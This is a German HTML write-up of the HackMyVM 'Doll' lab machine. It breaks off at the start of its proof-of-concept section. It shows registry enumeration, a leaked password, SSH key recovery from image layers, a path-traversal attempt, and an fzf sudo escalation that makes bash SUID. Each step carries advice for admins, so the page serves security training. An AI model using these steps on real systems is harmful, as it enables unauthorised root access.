@@ -1,0 +1,647 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doll - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Doll - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz (versucht)</div>
+                <div class="tool-item">docker / podman (versucht)</div>
+                <div class="tool-item">jq (implied)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">tar</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">fzf</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#docker-registry-enumeration">Docker Registry Enumeration</a></li>
+                <li><a href="#finding-credentials">Finding Credentials (Manifest & Layer Analysis)</a></li>
+                <li><a href="#initial-access">Initial Access (bela)</a></li>
+                <li><a href="#privesc-root">Privilege Escalation (bela -> root via fzf)</a></li>
+                <li><a href="#poc">Proof of Concept (fzf Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Standard-ARP-Scan wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Host `192.168.2.119` wird mit einer VirtualBox MAC-Adresse (`08:00:27:6e:e2:a2`) gefunden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf die gefundene IP-Adresse durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Standard-Netzwerksicherheitsmaßnahmen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.130
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.2	00:50:56:f4:7d:5f	VMware, Inc.
+192.168.2.119	08:00:27:6e:e2:a2	PCS Systemtechnik GmbH
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.858 seconds (137.78 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf `192.168.2.119` durchgeführt, um offene Ports, Dienste, Versionen und das Betriebssystem zu erkennen. Die Optionen `-sS`, `-sC`, `-T5`, `-AO`, `-p-` werden verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Zwei Ports sind offen:
+                *   **Port 22/tcp:** SSH (OpenSSH 8.4p1 Debian).
+                *   **Port 1007/tcp:** HTTP, von Nmap als **Docker Registry (API: 2.0)** identifiziert. Dies ist der wichtigste Fund, da eine Docker Registry verschiedene Angriffsvektoren bieten kann (Image-Analyse, API-Missbrauch).
+                Die OS-Erkennung deutet auf Linux/VirtualBox hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Docker Registry API auf Port 1007 gründlich. Versuchen Sie, Repositories aufzulisten, Images zu untersuchen oder hochzuladen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie die Docker Registry ab. Beschränken Sie den Zugriff, verwenden Sie Authentifizierung, wenn möglich. Stellen Sie sicher, dass keine sensiblen Informationen in den Images oder der Registry-Konfiguration vorhanden sind. Halten Sie SSH aktuell.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO 192.168.2.119 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-28 14:08 CEST
+Nmap scan report for doll (192.168.2.119)
+Host is up (0.00013s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey:
+|   3072 d732ac404ba84166d3d811496ceded4b (RSA)
+|   256 810e67f8c3d2501e4d092a5811c8d495 (ECDSA)
+|_  256 0dc37c540b9d3132f2d909d3eded93cd (ED25519)
+1007/tcp open  http    Docker Registry (API: 2.0)
+|_http-title: Site doesn't have a title.
+MAC Address: 08:00:27:6E:E2:A2 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms doll (192.168.2.119)
+
+OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.82 seconds
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="docker-registry-enumeration">
+            <h2>Docker Registry Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird verwendet, um den Dienst auf Port 1007 auf bekannte Webserver-Schwachstellen zu scannen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto findet keine Server-Banner, aber bestätigt die Docker Registry API (`docker-distribution-api-version: registry/2.0`) und den Endpunkt `/v2/_catalog`. Es meldet die üblichen fehlenden Security Header. Wichtig ist die Bestätigung, dass es sich um eine Docker Registry handelt.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Nutzen Sie `curl` oder spezialisierte Tools, um mit der Docker Registry API v2 zu interagieren. Beginnen Sie mit dem Abruf des Katalogs (`/v2/_catalog`).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Implementieren Sie fehlende Security Header (obwohl bei einer API weniger kritisch als bei einer interaktiven Webseite). Sichern Sie die Registry API selbst.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.119:1007</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.119
++ Target Hostname:    192.168.2.119
++ Target Port:        1007
++ Start Time:         2023-04-28 14:10:02 (GMT2)
+---------------------------------------------------------------------------
++ Server: No banner retrieved
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /x4YjO1fZ.vts: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0. # Zufälliger Dateiname, nicht relevant
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /v2/_catalog: This is the Docker Registry server. See: https://docs.docker.com/registry/
++ 8102 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2023-04-28 14:10:37 (GMT2) (35 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester greift manuell auf den von Nikto identifizierten Endpunkt `/v2/_catalog` zu (vermutlich im Browser oder mit `curl`, nicht explizit gezeigt, aber das Ergebnis wird notiert).
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die API gibt `{"repositories":["dolly"]}` zurück. Dies bestätigt, dass ein Repository namens `dolly` in der Registry existiert.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie das `dolly`-Repository. Listen Sie die Tags auf (`/v2/dolly/tags/list`) und inspizieren Sie die Manifeste (`/v2/dolly/manifests/[tag]`).
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Manuelle Abfrage (z.B. curl http://192.168.2.119:1007/v2/_catalog)
+# Ergebnis:
+{"repositories":["dolly"]}
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird erneut verwendet, um Verzeichnisse auf Port 1007 zu finden.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Findet nur `/v2`, was der Basis-API-Pfad ist. Für die Interaktion mit der Registry API ist Directory Busting weniger nützlich als gezielte API-Abfragen.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.119:1007 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+# ... (Optionen) ...
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.119:1007/v2                   (Status: 301) [Size: 39] [--> /v2/]
+===============================================================
+Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es werden verschiedene `curl`-Befehle verwendet, um mit der Registry zu interagieren:
+                 *   `curl -Iv http://doll.hmv:1007`: HEAD-Anfrage an `/`.
+                 *   `curl -Iv http://doll.hmv:1007/../../../../../../etc/passwd`: Versuchter Path Traversal.
+                 *   `ssh '<?php ... ?>'@doll.hmv`: Fehlgeleiteter SSH-Versuch.
+                 *   `view-source:http://.../_catalog?cmd=...`: Versuchter GET-Parameter Command Injection.
+                 *   `wfuzz` mit Host-Header: Subdomain-Fuzzing.
+                 *   `curl ... /v2/dolly/blobs/uploads/`: Tests von Upload-Endpunkten.
+                 *   `curl ... /v2/_catalog`, `curl ... /v2/dolly/tags/list`: Korrekte API-Abfragen.
+                 *   `curl ... /v2/_catalog?n=...`, `curl ... /v2/_catalog?last=...`: Tests von API-Parametern.
+                 *   `docker pull`, `docker run`: Versuche, das Image mit Client-Tools zu holen.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die meisten dieser Versuche sind entweder fehlgeleitet (Path Traversal, SSH-PHP-Injection, GET-Parameter-Injection auf API) oder scheitern an Fehlkonfigurationen/Missverständnissen (Upload-Pfade, Docker-Client mit HTTP statt HTTPS). Die Subdomain-Fuzzing liefert nichts. Die `docker pull/run`-Versuche scheitern am HTTPS-Problem des Clients.
+                **Erfolgreich** sind die Standard-API-Abfragen `/v2/_catalog` und `/v2/dolly/tags/list`, die das Repository `dolly` und den Tag `latest` bestätigen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignorieren Sie die fehlgeschlagenen, unpassenden Methoden. Konzentrieren Sie sich auf die funktionierenden API-Endpunkte. Der nächste logische Schritt ist das Abrufen des Manifests für `dolly:latest`.
+            </p>
+             <!-- Fehlgeschlagene Versuche (Auszug) -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -Iv http://doll.hmv:1007/../../../../../../etc/passwd</span></div>
+                     <pre>
+*   Trying 192.168.2.119:1007...
+* Connected to doll.hmv (192.168.2.119) port 1007 (#0)
+> HEAD /etc/passwd HTTP/1.1
+> Host: doll.hmv:1007
+> User-Agent: curl/7.88.1
+> Accept: */*
+>
+< HTTP/1.1 404 Not Found
+< Content-Type: text/plain; charset=utf-8
+< Docker-Distribution-Api-Version: registry/2.0
+< X-Content-Type-Options: nosniff
+< Date: Fri, 28 Apr 2023 12:21:45 GMT
+< Content-Length: 19
+<
+* Connection #0 to host doll.hmv left intact
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X GET http://192.168.2.119:1007/v2/dolly/blobs/uploads/</span></div>
+                     <pre>{"errors":[{"code":"BLOB_UPLOAD_UNKNOWN","message":"blob upload unknown to registry"}]}</pre>
+                 </div>
+             </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">docker pull 192.168.2.119:1007/dolly</span></div>
+                      <pre>
+Emulate Docker CLI using podman. Create /etc/containers/nodocker to quiet msg.
+Trying to pull 192.168.2.119:1007/dolly:latest...
+Error: initializing source docker://192.168.2.119:1007/dolly:latest: pinging container registry 192.168.2.119:1007: Get "https://192.168.2.119:1007/v2/": http: server gave HTTP response to HTTPS client
+                      </pre>
+                  </div>
+              </div>
+              <!-- Erfolgreiche API Calls -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -s http://192.168.2.119:1007/v2/_catalog</span></div>
+                      <pre>{"repositories":["dolly"]}</pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.119:1007/v2/dolly/tags/list</span></div>
+                      <pre>{"name":"dolly","tags":["latest"]}</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="finding-credentials">
+             <h2>Finding Credentials (Manifest & Layer Analysis)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Das Manifest für das Image `dolly:latest` wird über die API (`/v2/dolly/manifests/latest`) abgerufen und heruntergeladen. Anschließend wird die heruntergeladene Manifestdatei (`latest`) mit `grep` nach dem Schlüsselwort `pass` durchsucht.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Das Manifest wird erfolgreich heruntergeladen. Die `grep`-Suche ist erfolgreich und findet einen Eintrag in der `v1Compatibility`-Historie: `"Cmd":["ARG passwd=devilcollectsit"]}`. **Dies ist ein kritischer Fund!** Es enthüllt ein Passwort (`devilcollectsit`), das während des Image-Build-Prozesses als Argument verwendet wurde. Dieses Passwort könnte für einen SSH-Benutzer oder als Passphrase für einen SSH-Schlüssel gelten.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Merken Sie sich das Passwort `devilcollectsit`. Untersuchen Sie das Manifest weiter auf Benutzernamen oder andere Hinweise. Extrahieren und analysieren Sie die Image-Layer, die im Manifest unter `fsLayers` aufgeführt sind.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Speichern Sie niemals Passwörter oder sensible Argumente direkt im Dockerfile (z.B. als `ARG` oder `ENV`). Verwenden Sie sicherere Methoden wie Build-Secrets oder Multi-Stage-Builds, um sensible Daten nicht im finalen Image zu hinterlassen. Überprüfen Sie alle Docker-Images auf hartkodierte Zugangsdaten oder sensible Informationen im Manifest oder den Layern.
+             </p>
+             <!-- Manifest herunterladen -->
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.119:1007/v2/dolly/manifests/latest</span></div>
+                     <pre>
+{
+   "schemaVersion": 1,
+   "name": "dolly",
+   "tag": "latest",
+   "architecture": "amd64",
+   "fsLayers": [
+      {
+         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
+      },
+      # ... (weitere blobsums) ...
+      {
+         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
+      }
+   ],
+   "history": [
+      {
+         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{...},\"container\":\"10ddd...\",\"container_config\":{...},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89ce...\",\"os\":\"linux\",\"parent\":\"1430f...\"}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"1430f...\",\"parent\":\"638e...\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}" # Passwort gefunden!
+      },
+      # ... (weitere History-Einträge) ...
+   ],
+   "signatures": [
+      # ... (Signaturdaten) ...
+   ]
+}
+                    </pre>
+                 </div>
+             </div>
+             <!-- Download mit wget & grep -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.119:1007/v2/dolly/manifests/latest</span></div>
+                      <pre>
+--2023-04-28 19:08:52--  http://192.168.2.119:1007/v2/dolly/manifests/latest
+Verbindungsaufbau zu 192.168.2.119:1007 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 3476 (3,4K) [application/vnd.docker.distribution.manifest.v1+prettyjws]
+Wird in »latest« gespeichert.
+
+latest                  100%[==============================>]   3,39K  --.-KB/s    in 0s
+
+2023-04-28 19:08:52 (747 MB/s) - »latest« gespeichert [3476/3476]
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">grep pass latest</span></div>
+                      <pre>         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=<span class="password">devilcollectsit</span>\"]},\"throwaway\":true}"</pre>
+                  </div>
+              </div>
+
+              <p class="analysis">
+                  <strong>Analyse:</strong> Die `blobSum`-Hashes der einzelnen Layer werden aus der Manifestdatei `latest` extrahiert und in eine Datei `blobsum` geschrieben. Anschließend werden die Layer mittels einer `for`-Schleife und `wget` heruntergeladen. Der Dateityp der heruntergeladenen Layer wird mit `file` überprüft. Ein Layer (`sha256:5f...`) wird mit `tar xvf` entpackt.
+              </p>
+              <p class="evaluation">
+                  <strong>Bewertung:</strong> Die Layer werden korrekt identifiziert und heruntergeladen. `file` bestätigt, dass es sich um gzip-komprimierte Archive (tar.gz) handelt. Das Entpacken des Layers `sha256:5f...` ist erfolgreich und enthüllt eine Dateisystemstruktur, darunter `/etc/passwd`, `/etc/shadow` und `/home/bela/.ssh/id_rsa`. **Dies ist der zweite kritische Fund!** Der private SSH-Schlüssel für einen Benutzer namens `bela` befindet sich im Image.
+              </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Kombinieren Sie die beiden Funde: Verwenden Sie den privaten SSH-Schlüssel `/home/bela/.ssh/id_rsa` (aus dem entpackten Layer) und die im Manifest gefundene Passphrase `<span class="password">devilcollectsit</span>`, um sich als Benutzer `bela` per SSH am Zielsystem anzumelden.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> **Kritische Schwachstelle!** Betten Sie niemals private SSH-Schlüssel in Docker-Images ein. Verwenden Sie sicherere Methoden zur Schlüsselverwaltung (z.B. Secrets Management Tools, sichere Übergabe zur Laufzeit). Entfernen Sie sensible Daten aus den Image-Layern vor dem Veröffentlichen.
+              </p>
+              <!-- Layer herunterladen -->
+              <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">grep -i blobsum latest | awk '{print $2}' | tr -d '"' > blobsum</span></div>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat blobsum</span></div>
+                      <pre>
+sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
+sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
+sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">for i in $(cat blobsum); do wget "http://192.168.2.119:1007/v2/dolly/blobs/$i"; done</span></div>
+                      <pre>
+# ... (wget output for downloading 4 layers) ...
+                      </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">file sha256:*</span></div>
+                      <pre>
+sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017:   gzip compressed data, original size modulo 2^32 19456
+sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4:   gzip compressed data, original size modulo 2^32 1024
+sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4.1: gzip compressed data, original size modulo 2^32 1024
+sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09:   gzip compressed data, original size modulo 2^32 7337984
+                      </pre>
+                  </div>
+              </div>
+              <!-- Layer entpacken -->
+              <div class="code-block">
+                   <div class="terminal">
+                       <!-- Annahme: Ein Verzeichnis 'Doll' wurde erstellt, um die Layer zu entpacken -->
+                       <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkdir Doll && cd Doll</span></div>
+                       <div class="prompt">┌──(root㉿cyber)-[~/Doll]
+└─# <span class="command">tar xvf ../sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017</span></div>
+                       <pre>
+etc/
+etc/group
+etc/group-
+etc/passwd
+etc/passwd-
+etc/shadow
+etc/shadow-
+home/
+home/bela/
+home/bela/.wh..wh..opq
+home/bela/.ash_history
+home/bela/.ssh/
+home/bela/.ssh/id_rsa # SSH Key gefunden!
+root/
+root/.ash_history
+                       </pre>
+                   </div>
+               </div>
+               <!-- SSH Key untersuchen -->
+               <div class="code-block">
+                   <div class="terminal">
+                       <div class="prompt">┌──(root㉿cyber)-[~/Doll]
+└─# <span class="command">ls -la home/bela/.ssh/</span></div>
+                       <pre>
+insgesamt 4
+drwxr-sr-x 2 cyber cyber 4096 Apr 25 10:53 .
+drwxr-sr-x 3 cyber cyber 4096 Apr 25 10:53 ..
+-rw-r--r-- 1 cyber cyber 2635 Apr 25 10:53 id_rsa
+                       </pre>
+                   </div>
+               </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (bela)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der im Docker-Layer gefundene private SSH-Schlüssel (`id_rsa`) wird mit den korrekten Berechtigungen (`chmod 600`) versehen. Anschließend wird versucht, sich per SSH als Benutzer `bela` unter Verwendung dieses Schlüssels anzumelden. Bei der Abfrage der Passphrase wird das im Docker-Manifest gefundene Passwort `<span class="password">devilcollectsit</span>` eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Der Angreifer erhält eine Shell als Benutzer `bela` auf dem Zielsystem `doll`. Die Kombination aus dem geleakten Schlüssel und dem geleakten Passwort (als Passphrase) war der Schlüssel zum initialen Zugriff.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie die lokale Enumeration als `bela`. Suchen Sie nach der User-Flag und nach Wegen zur Rechteausweitung (`sudo -l`, SUID-Binaries etc.).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entfernen Sie den kompromittierten SSH-Schlüssel und das Passwort. Beheben Sie die Schwachstellen in der Docker Registry und im Image-Build-Prozess.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Doll/home/bela/.ssh]
+└─# <span class="command">chmod 600 id_rsa</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Doll/home/bela/.ssh]
+└─# <span class="command">ssh bela@doll.hmv -i id_rsa</span></div>
+                     <pre>
+Enter passphrase for key 'id_rsa': <span class="password">devilcollectsit</span>
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
+                     </pre>
+                      <div class="prompt no-kali-prompt">bela@doll:~$ </div>
+                 </div>
+             </div>
+        </section>
+
+        <section id="privesc-root">
+            <h2>Privilege Escalation (bela -> root via fzf)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `bela` werden die `sudo`-Berechtigungen überprüft (`sudo -l`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Kritischer Fund!** Der Benutzer `bela` darf `/usr/bin/fzf --listen=1337` als `ALL` (root) ohne Passwort (`NOPASSWD:`) ausführen. `fzf` ist ein Fuzzy-Finder, aber die Option `--listen` startet einen Listener, der Befehle über Netzwerk entgegennehmen und ausführen kann. Dies ist eine bekannte Methode zur Rechteausweitung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie diese `sudo`-Regel aus:
+                1.  Bauen Sie eine SSH-Verbindung mit Local Port Forwarding auf (`ssh -L 1337:127.0.0.1:1337 ...`).
+                2.  Führen Sie auf dem Zielsystem `sudo /usr/bin/fzf --listen=1337` aus.
+                3.  Senden Sie von Ihrer Angreifer-Maschine einen Befehl mittels `curl` an `http://localhost:1337`, um z.B. `/bin/bash` SUID zu machen (`curl -X POST http://localhost:1337 -d 'execute(chmod +s /bin/bash)'`).
+                4.  Führen Sie `/bin/bash -p` aus, um eine Root-Shell zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Höchste Priorität!** Diese `sudo`-Regel ist extrem gefährlich und muss sofort entfernt werden. Erlauben Sie Benutzern niemals, Programme wie `fzf` mit potenziell gefährlichen Optionen (`--listen`) als `root` auszuführen, schon gar nicht ohne Passwort.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">sudo -l</span></div>
+                     <pre>
+Matching Defaults entries for bela on doll:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User bela may run the following commands on doll:
+    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">ss -altpn</span></div>
+                      <pre>
+State                 Recv-Q                Send-Q                                 Local Address:Port                                 Peer Address:Port                Process
+LISTEN                0                     4096                                         0.0.0.0:1007                                      0.0.0.0:*                    users:(("registry",pid=365,fd=3))
+LISTEN                0                     128                                          0.0.0.0:22                                        0.0.0.0:*                    users:(("sshd",pid=419,fd=3))
+LISTEN                0                     4096                                            [::]:1007                                         [::]:*                    users:(("registry",pid=365,fd=4))
+LISTEN                0                     128                                             [::]:22                                           [::]:*                    users:(("sshd",pid=419,fd=4))
+                      </pre>
+                      <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">file /usr/bin/fzf</span></div>
+                      <pre>
+/usr/bin/fzf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=IAiCh96vH2mpJhGn1Byw/KHX0PhGCs2UsPl3F370x/IPOfpU9VnDnl61Jy23YA/A3osMwxIbl-_B05oDBHB, stripped
+                      </pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (fzf Exploit)</h2>
+             <p class="analysis">
